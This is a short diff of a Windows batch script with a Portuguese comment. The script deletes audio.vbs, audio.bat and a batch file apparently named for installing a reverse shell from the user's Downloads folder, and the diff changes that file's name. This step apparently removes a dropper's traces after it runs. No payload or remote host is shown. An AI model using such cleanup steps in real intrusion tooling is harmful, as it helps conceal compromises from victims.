@@ -43,6 +43,6 @@ timeout /t 2 /nobreak >nul
 :: Deletar .vbs .bat
 del "%USERPROFILE%\Downloads\audio.vbs"
 del "%USERPROFILE%\Downloads\audio.bat"
-del "%USERPROFILE%\Downloads\Install_Shell.bat"
+del "%USERPROFILE%\Downloads\Install_Shell_Reverse.bat"
 
 exit
